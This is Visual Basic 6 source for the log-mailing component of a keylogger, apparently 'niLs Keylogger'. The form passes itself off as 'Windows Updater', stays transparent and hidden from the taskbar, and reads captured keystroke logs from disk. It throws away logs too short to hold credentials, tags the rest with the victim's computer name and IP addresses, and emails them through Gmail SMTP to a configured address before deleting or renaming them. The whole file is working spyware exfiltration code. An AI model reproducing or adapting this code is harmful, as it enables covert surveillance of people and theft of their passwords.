VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "Windows Updater"
   ClientHeight    =   195
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   195
   Icon            =   "SendMail.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   195
   ScaleWidth      =   195
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox txtLog 
      Height          =   4092
      Left            =   4680
      MultiLine       =   -1  'True
      TabIndex        =   3
      Top             =   360
      Width           =   3252
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   1440
      Top             =   0
   End
   Begin VB.FileListBox File1 
      Height          =   3990
      Left            =   120
      Pattern         =   "*.nkl"
      TabIndex        =   1
      Top             =   360
      Width           =   1572
   End
   Begin VB.TextBox txtSendThis 
      Height          =   4095
      Left            =   1800
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   360
      Width           =   1812
   End
   Begin VB.Label lblSec 
      Caption         =   "0"
      Height          =   252
      Left            =   120
      TabIndex        =   2
      Top             =   0
      Width           =   1212
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Option Explicit

'to Get public IP
Private Declare Function URLDownloadToFile Lib "urlmon" _
   Alias "URLDownloadToFileA" _
  (ByVal pCaller As Long, _
   ByVal szURL As String, _
   ByVal szFileName As String, _
   ByVal dwReserved As Long, _
   ByVal lpfnCB As Long) As Long
   
Private Const ERROR_SUCCESS As Long = 0
Private Const BINDF_GETNEWESTVERSION As Long = &H10
Private Const INTERNET_FLAG_RELOAD As Long = &H80000000

'Special Folder Path
Public Enum mceIDLPaths
   ' CSIDL_APPDATA = &H19  'C:\WINNT\Profiles\username\Application Data.
    CSIDL_PROGDATA = &H23
End Enum
Private Declare Function SHGetSpecialFolderPath Lib "SHELL32.DLL" Alias "SHGetSpecialFolderPathA" (ByVal hwnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean
Public DeleteSentLogs As Boolean, LocalIP, PublicIP As String
Private Sub Form_Load()
If App.PrevInstance = True Then End 'no multiple instances allowed
TransparentForm Me
Me.Left = Screen.Width - Me.Width
Me.Top = Screen.Height - Me.Height
Call LoadSetting
End Sub
Private Sub LoadSetting()
Dim sendTo, sendFrom, Password, CompName, RetryTime, SettingsPath, LogDir, PubIP As String
SettingsPath = GetSpecialFolderA(CSIDL_PROGDATA)

If Dir(SettingsPath & "System\settings.txt") <> "" Then
    'Load settings
    Open (SettingsPath & "System\settings.txt") For Input As 1
    Input #1, LogDir, CompName, sendTo, sendFrom, Password, RetryTime, PubIP
    Close #1
Else
    'setting not found Load default value
    sendTo = "none"
End If

If Len(sendTo) < 15 Then
    End
Else
    'Apply/adjust settings variables
    If Left(CompName, 1) = "*" Then DeleteSentLogs = True
    If Left(LogDir, 2) = "u:" Then LogDir = Environ$("USERPROFILE") & Mid(LogDir, 3, Len(LogDir) - 2)
    File1.Path = LogDir
    Timer1.Interval = 1000 * Val(RetryTime)
    If Len(PubIP) < 8 Then
        PublicIP = getPublicIP()
    Else
        PublicIP = getPublicIP(PubIP)
    End If
    LocalIP = getLocalIP
    StartSend sendTo, sendFrom, Password
End If
End Sub
Private Sub StartSend(ByVal sendTo As String, ByVal sendFrom As String, ByVal Password As String)
Dim LogFilePath As String
File1.Refresh
If (File1.ListCount > 1) Then           'Contain yesterday's log or old logs send them
    File1.ListIndex = 0                 'Choose first log which will be oldest
    LogFilePath = File1.Path & "\" & File1.FileName
    If ReadLog(LogFilePath) < 40 Then
                                        'But Limited User Cant Delete Admin Files
        Kill LogFilePath                'Discard that Log which has nothing like login credentials
    Else
        Call SendLog(LogFilePath, sendTo, sendFrom, Password)
    End If
Else    'Nothing to send
    'MsgBox "Nothing to send"
    End
End If
End Sub
Private Function ReadLog(ByVal LogFile As String) As Integer
'Read Log & add to txtLog returns length of txtLog
txtLog.Text = ""
Dim sTemp As String
Open LogFile For Input As 2
      While Not EOF(2)
        Line Input #2, sTemp
        If Left(sTemp, 2) <> Chr(34) & Chr(155) Then
            txtLog.Text = txtLog.Text & sTemp & "<br>"
        End If
      Wend
Close #2
ReadLog = Len(txtLog.Text)
End Function
Private Sub SendLog(ByVal LogFile As String, ByVal sendTo As String, ByVal sendFrom As String, ByVal Password As String)         'Reads log header and calls send email

Dim NoNeed, lTime, lDate, AppRevision As String

'Read initials
Open LogFile For Input As 1
Input #1, NoNeed, lTime, lDate, CompName, AppRevision
Close #1

txtSendThis = "<b>Keylog Generated with <a href=" & Chr(34) & "nilskeylogger.blogspot.in" & Chr(34) & _
">niLs Keylogger</a></b><br>" & _
"<b>Computer Name: </b>" & CompName & "(" & VBA.Environ$("COMPUTERNAME") & ")" & "<br>" & _
"<b>IP Address: </b> " & PublicIP & " | " & LocalIP & "<br>" & _
"<b>Start Time: </b>" & lDate & "  " & lTime & "<br>" & _
"<b>End Time: </b>" & FileDateTime(LogFile) & "<br>" & _
"<b>AppVersion: </b>" & AppRevision & "<br>" & _
"----------------------------<br><br>" & txtLog.Text

'GoTo skipEmail
'Email sending starts
'------------------------------------------------------
Set iMsg = CreateObject("CDO.Message")
Set iConf = CreateObject("CDO.Configuration")
Set Flds = iConf.Fields

' send one copy with Google SMTP server (with autentication)
schema = "http://schemas.microsoft.com/cdo/configuration/"
Flds.Item(schema & "sendusing") = 2
Flds.Item(schema & "smtpserver") = "smtp.gmail.com"
Flds.Item(schema & "smtpserverport") = 465
Flds.Item(schema & "smtpauthenticate") = 1
Flds.Item(schema & "sendusername") = sendFrom '"yourID@gmail.com"
Flds.Item(schema & "sendpassword") = Password '"myPassword"
Flds.Item(schema & "smtpusessl") = 1
Flds.Update

On Error GoTo Err2
With iMsg
    .To = sendTo '"anyone@anything.com"
    .From = sendFrom '"yourID@gmail.com"
    .Subject = "niLsKLG (" & CompName & ")"
'   .BCC="someone@example.com"
    .HTMLBody = txtSendThis.Text
'   .TextBody = txtSendThis.Text
'    .AddAttachment LogFile
Set .Configuration = iConf
    .Send
End With

Set iMsg = Nothing
Set iConf = Nothing
Set Flds = Nothing

'skipEmail:

'Email Sent! change the name of file So it will not be resent

'On Error Resume Next       'Limited user cannot rename admin files
If DeleteSentLogs = True Then
    Kill LogFile
Else
    Name LogFile As Left(LogFile, Len(LogFile) - 3) & "snkl"
End If
'send Next log
Call StartSend(sendTo, sendFrom, Password)      'RECURSIVE CALL BE CAREFUL

Err2:
'Email not sent
If Err.Number <> 0 Then
    If Timer1.Interval = 0 Then End
    If Err.Number = -2147220973 Then
        Timer1.Enabled = True  'PC might not be connected Retry after Sometim.
    Else
        'MsgBox Err.Description: 'Password, Username or any setting might be wrong
        End
    End If
End If

End Sub

Private Sub Timer1_Timer()
lblSec.Caption = lblSec.Caption + 1
If lblSec.Caption = 60 Then lblSec.Caption = 0: Call LoadSetting    'initiate from start
End Sub
Public Function GetSpecialFolderA(ByVal eSpecialFolder As mceIDLPaths) As String

Dim Ret As Long
Dim Trash As String: Trash = Space$(260)

    Ret = SHGetSpecialFolderPath(0, Trash, eSpecialFolder, False)
    If Trim$(Trash) <> Chr(0) Then Trash = Left$(Trash, InStr(Trash, Chr(0)) - 1) & "\"
     
    GetSpecialFolderA = Trash
    

End Function
Private Function getPublicIP(Optional ByVal FromSite As String = "http://wgetip.com/") As String

Dim sSourceUrl, sLocalFile As String
sLocalFile = File1.Path & "\IP.txt"
sSourceUrl = FromSite
'This site provides IP is Text only format

If DownloadFile(sSourceUrl, sLocalFile) Then
      Dim strIP As String
      Open sLocalFile For Input As 1
      Input #1, strIP
      Close #1
      PublicIP = strIP
End If

If Dir(sLocalFile) <> "" Then Kill sLocalFile

End Function

Public Function DownloadFile(ByVal sSourceUrl As String, _
                             sLocalFile As String) As Boolean
  
  'Download the file. BINDF_GETNEWESTVERSION forces
  'the API to download from the specified source.
  'Passing 0& as dwReserved causes the locally-cached
  'copy to be downloaded, if available. If the API
  'returns ERROR_SUCCESS (0), DownloadFile returns True.
   DownloadFile = URLDownloadToFile(0&, _
                                    sSourceUrl, _
                                    sLocalFile, _
                                    BINDF_GETNEWESTVERSION, _
                                    0&) = ERROR_SUCCESS
   
End Function

Public Function getLocalIP() As String

Dim WMI     As Object
Dim qryWMI  As Object
Dim Item    As Variant
Dim IPAd As String

    Set WMI = GetObject("winmgmts:\\.\root\cimv2")

    Set qryWMI = WMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration " & _
                               "WHERE IPEnabled = True")

IPAd = ""
    For Each Item In qryWMI
      IPAd = IPAd & "  " & Item.IPAddress(0)
    Next

    Set WMI = Nothing
    Set qryWMI = Nothing
getLocalIP = IPAd   'return all Ips separated by spaces
End Function

